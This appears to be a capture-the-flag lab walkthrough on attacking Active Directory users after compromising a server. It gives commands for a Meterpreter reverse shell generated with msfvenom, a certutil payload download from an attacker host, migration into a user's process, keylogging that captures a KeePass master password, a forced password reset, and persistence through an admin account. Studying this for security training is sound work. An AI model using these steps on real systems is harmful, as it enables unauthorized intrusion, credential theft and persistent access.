# Exploiting Active Directory Users

We have achieved significant progress in our exploitation efforts. With full administrative access to workstations and servers, we can perform post-exploitation on almost any Tier 1 and Tier 2 system. However, to reach our objectives, we need to go further and target Active Directory (AD) users.

---

## Users and User Behavior

> "The factory of the future will only have two employees. A human and a dog. The human will be there to feed the dog. The dog will be there to bite the human if they try to touch something."  
> — Warren Bennis

Users are often the weakest link in the security chain. Weak passwords and poor security habits, such as granting overly permissive permissions, are common. Overlooking this attack surface would be a mistake. In this task, we focus on two key elements:

- **Credential Management**: How users store their credentials. In AD, users may have multiple sets of credentials, making secure storage essential.
- **Keylogging**: Understanding how users interact with a system can be valuable. Keylogging, combined with screengrabs, helps attackers gain this perspective.

---

## Hunting for Credentials

After compromising `THMSERVER1`, enumerate user directories for valuable information. You may find a `.kdbx` file—a credential database (e.g., KeePass). Use Meterpreter's `download` command to recover this file.

However, the database is encrypted. Cracking the password may not be feasible if the user chose a strong one. Instead, observe how the user interacts with the database.

---

## SYSTEM is Sometimes Too Privileged

Meterpreter includes a keylogger, but running it as `SYSTEM` is ineffective since `SYSTEM` does not type keystrokes. To capture user credentials, migrate your shell to the target user's context.

### Steps:

1. **Obtain a Meterpreter Shell**  
    Generate a PowerShell Meterpreter payload:
    ```sh
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT=<Listening port> -f psh -o shell.ps1
    ```
    Start a listener in `msfconsole`:
    ```sh
    sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST exploitad; set LPORT <listening port>; exploit"
    ```
    Host the payload and copy it to the target:
    ```sh
    certutil.exe -urlcache -split -f http://<your_ip>/shell.ps1
    ```

2. **Identify User Processes**  
    List processes and filter for `explorer.exe`:
    ```sh
    meterpreter> ps | grep "explorer"
    ```
    Example output:
    ```
    PID   PPID  Name          Arch  Session  User                     Path
    ---   ----  ----          ----  -------  ----                     ----
    3612  3592  explorer.exe  x64   1        THMSERVER1\trevor.local  C:\Windows\explorer.exe
    ```

    *If `explorer.exe` for `trevor.local` is not running:*
    - Reset the password:  
      `net user trevor.local <chosen password>`
    - Start explorer:  
      `C:\auto-login.ps1 trevor.local <chosen password> THMSERVER1`
    - Reboot the server:  
      `shutdown -r`

3. **Migrate to the User Process**  
    ```sh
    meterpreter> migrate 3612
    [*] Migrating from 4408 to 3612...
    [*] Migration completed successfully.
    ```

    Confirm context:
    ```sh
    meterpreter> getuid
    Server username: THMSERVER1\trevor.local
    ```

4. **Start the Keylogger**  
    ```sh
    meterpreter> keyscan_start
    Starting the keystroke sniffer ...
    ```

    Wait, then dump keystrokes:
    ```sh
    meterpreter> keyscan_dump
    Dumping captured keystrokes...
    keep<CR>
    <Shift>Passwordpasswordpassword<CR>
    ```

---

## Next Steps

This is a basic example of targeting AD users. User targeting should be part of your exploitation methodology. To answer related questions, use KeePass (installed on the AttackBox or installable via `sudo apt install keepassx` on most Linux distros). Download the KeePass database with Meterpreter and ensure proper file ownership before opening it.

**Tip:** Consider creating a local admin account on `THMSERVER1` for persistence, though this is optional and requires additional research.
